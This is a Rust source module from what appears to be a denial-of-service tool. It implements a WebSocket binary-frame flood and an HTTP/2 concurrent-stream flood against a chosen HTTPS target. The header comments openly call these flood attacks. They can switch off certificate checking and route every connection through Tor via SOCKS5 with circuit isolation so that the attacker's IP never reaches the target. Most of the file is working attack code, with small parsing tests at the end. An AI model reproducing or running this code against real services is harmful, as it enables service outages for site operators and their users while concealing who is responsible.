//! Protocol-fidelity flood attacks that require real connection handling:
//!
//! - `fetch_websocket_flood` (#4): completes a genuine WebSocket handshake via
//!   `tokio-tungstenite`, then floods binary frames over the open socket.
//! - `fetch_h2_stream_flood` (#5): performs a real HTTP/2 handshake (ALPN +
//!   preface) via the `h2` crate and multiplexes many concurrent streams, each
//!   carrying a DATA payload — a fundamentally different stress vector than the
//!   HTTP/1.1 modes and distinct from the RST-based `h2rapidreset`.
//!
//! Both open their own connection to the target host:port (they need raw byte
//! control that reqwest's pooled client does not expose). When a SOCKS5 proxy
//! is supplied the whole connection — TCP + TLS — is tunnelled through it, so
//! no client IP ever reaches the target (zero-IP-leakage Tor routing). The
//! target must be an `https://`/`wss://` URL (TLS is required — plaintext
//! h2c/ws are not supported here).

use crate::types::FetchError;
use futures::SinkExt;
use std::sync::Arc;
use std::task::Poll;
use std::time::Duration;
use tokio::net::TcpStream;

/// Parse an `https://host[:port]/path?query` URL into `(host, port, is_tls, path, authority)`.
fn parse_target(url: &str) -> Result<(String, u16, bool, String, String), FetchError> {
    let u = url::Url::parse(url).map_err(|e| format!("bad target url '{}': {}", url, e))?;
    let scheme = u.scheme();
    let is_tls = match scheme {
        "https" | "wss" => true,
        "http" | "ws" => false,
        _ => return Err(format!("unsupported scheme '{}' for protocol attack", scheme).into()),
    };
    let host = u
        .host_str()
        .ok_or_else(|| format!("target url '{}' has no host", url))?
        .to_string();
    let port = u.port().unwrap_or(if is_tls { 443 } else { 80 });
    let path = if u.path().is_empty() {
        "/".to_string()
    } else {
        let p = u.path().to_string();
        match u.query() {
            Some(q) => format!("{}?{}", p, q),
            None => p,
        }
    };
    let authority = if u.port().is_some() {
        format!("{}:{}", host, port)
    } else {
        host.clone()
    };
    Ok((host, port, is_tls, path, authority))
}

/// A certificate verifier that accepts anything (for `--insecure`).
#[derive(Debug)]
struct NoVerifier;
impl rustls::client::danger::ServerCertVerifier for NoVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }
    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }
    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
            rustls::SignatureScheme::ED448,
        ]
    }
}

/// Build a rustls client config (webpki roots, ALPN h2+http/1.1) honoring insecure.
fn build_tls_config(insecure: bool) -> Arc<rustls::ClientConfig> {
    let mut cfg = rustls::ClientConfig::builder()
        .with_root_certificates(rustls::RootCertStore {
            roots: webpki_roots::TLS_SERVER_ROOTS.to_vec(),
        })
        .with_no_client_auth();
    if insecure {
        cfg.dangerous()
            .set_certificate_verifier(Arc::new(NoVerifier));
    }
    cfg.alpn_protocols = vec![b"h2".to_vec(), b"http/1.1".to_vec()];
    Arc::new(cfg)
}

/// Parse a `socks5h://[user:pass@]host:port` SOCKS5 proxy URL into
/// `(host, port, Option<(username, password)>)`. Bare `host:port` also works.
///
/// Tor convention: the userinfo is used as a per-circuit isolation stream id
/// (e.g. `tor0:isolate@` names a distinct stream so Tor assigns a new circuit),
/// so we pass it as the SOCKS5 username when present.
fn parse_socks5_proxy(url: &str) -> (String, u16, Option<(String, String)>) {
    let u = match url::Url::parse(url) {
        Ok(u) => u,
        _ => {
            // Bare host:port fallback.
            let (host, port) = url.rsplit_once(':').unwrap_or((url, "9050"));
            return (host.to_string(), port.parse().unwrap_or(9050), None);
        }
    };
    let host = u.host_str().unwrap_or("127.0.0.1").to_string();
    let port = u.port().unwrap_or(9050);
    let auth = if u.username().is_empty() && u.password().is_none() {
        None
    } else {
        Some((u.username().to_string(), u.password().unwrap_or_default().to_string()))
    };
    (host, port, auth)
}

/// Open a TCP connection to `host:port`, optionally tunnelled through a SOCKS5
/// proxy. When `proxy` is `Some`, the entire connection (including TLS for
/// wss/h2) is established through the proxy so no client IP ever reaches the
/// target — required for zero-IP-leakage Tor routing. Returns `Err` if the
/// proxy handshake fails so the caller can pick another circuit/proxy.
async fn dial_tcp(
    host: &str,
    port: u16,
    proxy: Option<&str>,
) -> Result<TcpStream, FetchError> {
    match proxy {
        Some(p) => {
            let (phost, pport, auth) = parse_socks5_proxy(p);
            let tcp = match auth {
                Some((user, pass)) => {
                    tokio::time::timeout(
                        Duration::from_secs(15),
                        tokio_socks::tcp::Socks5Stream::connect_with_password(
                            (phost.as_str(), pport),
                            (host.to_string(), port),
                            &user,
                            &pass,
                        ),
                    )
                    .await
                    .map_err(|_| format!("SOCKS5 connect timeout via {}", p))?
                    .map_err(|e| format!("SOCKS5 connect via {} failed: {}", p, e))?
                }
                None => {
                    tokio::time::timeout(
                        Duration::from_secs(15),
                        tokio_socks::tcp::Socks5Stream::connect(
                            (phost.as_str(), pport),
                            (host.to_string(), port),
                        ),
                    )
                    .await
                    .map_err(|_| format!("SOCKS5 connect timeout via {}", p))?
                    .map_err(|e| format!("SOCKS5 connect via {} failed: {}", p, e))?
                }
            };
            Ok(tcp.into_inner())
        }
        None => {
            let addr = format!("{}:{}", host, port);
            let tcp = tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(&addr))
                .await
                .map_err(|_| format!("connect timeout to {}", addr))?
                .map_err(|e| format!("connect to {} failed: {}", addr, e))?;
            Ok(tcp)
        }
    }
}

/// Establish a TLS TCP connection to the target (through SOCKS5 when proxying).
async fn dial(
    host: &str,
    port: u16,
    is_tls: bool,
    insecure: bool,
    proxy: Option<&str>,
) -> Result<tokio_rustls::client::TlsStream<TcpStream>, FetchError> {
    if !is_tls {
        return Err("plaintext protocol attacks not supported; use an https:// target".into());
    }
    let tcp = dial_tcp(host, port, proxy).await?;
    let _ = tcp.set_nodelay(true);
    let cfg = build_tls_config(insecure);
    let server_name = rustls::pki_types::ServerName::try_from(host.to_string())
        .map_err(|_| format!("invalid server name '{}'", host))?;
    let connector = tokio_rustls::TlsConnector::from(cfg);
    let tls = tokio::time::timeout(Duration::from_secs(10), connector.connect(server_name, tcp))
        .await
        .map_err(|_| format!("TLS handshake timeout to {}:{}", host, port))??;
    Ok(tls)
}

// ================================================================
// #4 — Real WebSocket frame flood
// ================================================================
/// Complete a real WebSocket handshake with `tokio-tungstenite`, then flood
/// binary frames over the open socket. Reports total bytes sent as the
/// "response bytes" and the handshake HTTP status (101) on success.
///
/// The socket is dialed through `proxy` (SOCKS5) when provided so the handshake
/// and frames are fully Tor-routed.
pub(crate) async fn fetch_websocket_flood(
    url: String,
    delay: u64,
    verbose: bool,
    insecure: bool,
    n_frames: usize,
    proxy: Option<&str>,
) -> Result<(usize, u16), FetchError> {
    if delay > 0 {
        tokio::time::sleep(Duration::from_millis(delay)).await;
    }
    let (host, port, is_tls, path, authority) = parse_target(&url)?;
    let scheme = if is_tls { "wss" } else { "ws" };
    let ws_url = format!("{}://{}{}", scheme, authority, path);
    if verbose {
        println!(
            "[VERBOSE] fetch_websocket_flood: connecting to {} ({} frames, proxy: {})",
            ws_url,
            n_frames,
            proxy.unwrap_or("direct")
        );
    }

    // Dial TCP (+TLS) ourselves so we can route it through the SOCKS5 proxy,
    // then hand the established stream to tungstenite for the WS upgrade.
    let tls = dial(&host, port, is_tls, insecure, proxy).await?;
    let request = tokio_tungstenite::tungstenite::client::IntoClientRequest::into_client_request(ws_url)
        .map_err(|e| format!("ws request build failed: {}", e))?;
    let (mut ws, resp) = tokio_tungstenite::client_async(request, tls)
        .await
        .map_err(|e| format!("ws connect failed: {}", e))?;
    let status = resp.status().as_u16();

    use tokio_tungstenite::tungstenite::Message;
    let payload = vec![0x41u8; 4096];
    let mut sent = 0usize;
    let mut last_err: Option<String> = None;
    for _ in 0..n_frames {
        match ws.send(Message::Binary(payload.clone().into())).await {
            Ok(()) => sent += payload.len(),
            Err(e) => {
                last_err = Some(e.to_string());
                break;
            }
        }
    }
    let _ = ws.close(None).await;
    if verbose {
        println!(
            "  [WS] handshake {} | sent {} bytes over {} frames",
            status, sent, n_frames
        );
    }
    if sent == 0 {
        if let Some(e) = last_err {
            return Err(format!("ws flood sent no frames: {}", e).into());
        }
    }
    Ok((sent, status))
}

// ================================================================
// #5 — HTTP/2 stream-multiplexing flood
// ================================================================
/// Perform a real HTTP/2 handshake and multiplex `n_streams` concurrent streams
/// on the single connection, each POSTing a DATA payload. Exercises the server's
/// concurrent-stream state machine and per-stream buffers — distinct from both
/// the HTTP/1.1 floods and the RST-based `h2rapidreset`.
///
/// The connection is dialed through `proxy` (SOCKS5) when provided so the h2
/// handshake and all streams are fully Tor-routed.
pub(crate) async fn fetch_h2_stream_flood(
    url: String,
    delay: u64,
    verbose: bool,
    insecure: bool,
    n_streams: usize,
    proxy: Option<&str>,
) -> Result<(usize, u16), FetchError> {
    if delay > 0 {
        tokio::time::sleep(Duration::from_millis(delay)).await;
    }
    let (host, port, is_tls, path, authority) = parse_target(&url)?;
    let tls = dial(&host, port, is_tls, insecure, proxy).await?;
    if verbose {
        println!(
            "[VERBOSE] fetch_h2_stream_flood: {} | {} streams over 1 connection (proxy: {})",
            url,
            n_streams,
            proxy.unwrap_or("direct")
        );
    }

    let (mut client, h2conn) = h2::client::handshake(tls)
        .await
        .map_err(|e| format!("h2 handshake failed: {}", e))?;
    // Drive the connection state machine in the background.
    tokio::spawn(async move {
        let _ = h2conn.await;
    });

    let payload = vec![0x42u8; 2048];
    let mut sent = 0usize;
    let mut first_status = 0u16;
    let mut response_handles = Vec::with_capacity(n_streams);

    for _ in 0..n_streams {
        let req = http::Request::builder()
            .method(http::Method::POST)
            .uri(format!("https://{}{}", authority, path))
            .header("content-length", payload.len().to_string())
            .body(())
            .map_err(|e| format!("h2 request build failed: {}", e))?;
        let (resp_fut, mut stream) = client
            .send_request(req, false)
            .map_err(|e| format!("h2 send_request failed: {}", e))?;
        // Reserve flow-control capacity, wait for the grant, then send DATA + END_STREAM.
        stream.reserve_capacity(payload.len());
        let granted = tokio::time::timeout(
            Duration::from_millis(100),
            futures::future::poll_fn(|cx| match stream.poll_capacity(cx) {
                Poll::Ready(Some(Ok(n))) if n > 0 => Poll::Ready(n),
                Poll::Ready(Some(Ok(_))) => Poll::Pending,
                Poll::Ready(Some(Err(e))) => Poll::Ready(0usize.saturating_sub(e.to_string().len())),
                Poll::Ready(None) => Poll::Ready(0usize),
                Poll::Pending => Poll::Pending,
            }),
        )
        .await;
        let can_send = matches!(granted, Ok(n) if n > 0);
        if can_send && stream.send_data(bytes::Bytes::from(payload.clone()), true).is_ok() {
            sent += payload.len();
        }
        response_handles.push(resp_fut);
    }

    // Collect a few response statuses (bounded so we don't stall the tick).
    for fut in response_handles.into_iter().take(8) {
        if let Ok(Ok(resp)) = tokio::time::timeout(Duration::from_millis(200), fut).await {
            let s = resp.status().as_u16();
            if first_status == 0 {
                first_status = s;
            }
        }
    }
    if verbose {
        println!(
            "  [H2] sent {} bytes over {} streams (first status {})",
            sent, n_streams, first_status
        );
    }
    Ok((sent, if first_status == 0 { 200 } else { first_status }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn socks5_parse_full_tor_url() {
        let (host, port, auth) = parse_socks5_proxy("socks5h://tor3:isolate@127.0.0.1:9050");
        assert_eq!(host, "127.0.0.1");
        assert_eq!(port, 9050);
        assert_eq!(auth, Some(("tor3".to_string(), "isolate".to_string())));
    }

    #[test]
    fn socks5_parse_bare_host_port() {
        let (host, port, auth) = parse_socks5_proxy("192.168.1.5:1080");
        assert_eq!(host, "192.168.1.5");
        assert_eq!(port, 1080);
        assert_eq!(auth, None);
    }

    #[test]
    fn socks5_parse_no_auth_url_defaults_port() {
        let (host, port, auth) = parse_socks5_proxy("socks5h://localhost");
        assert_eq!(host, "localhost");
        assert_eq!(port, 9050);
        assert_eq!(auth, None);
    }

    #[test]
    fn parse_target_https_with_path_and_query() {
        let (host, port, is_tls, path, authority) =
            parse_target("https://example.com:8443/api?q=1").unwrap_or_else(|e| panic!("parse: {}", e));
        assert_eq!(host, "example.com");
        assert_eq!(port, 8443);
        assert!(is_tls);
        assert_eq!(path, "/api?q=1");
        assert_eq!(authority, "example.com:8443");
    }

    #[test]
    fn parse_target_rejects_plain_http_for_tls_only_modes() {
        let (_, _, is_tls, _, _) = parse_target("http://example.com/x").unwrap_or_else(|e| panic!("parse: {}", e));
        assert!(!is_tls);
    }
}
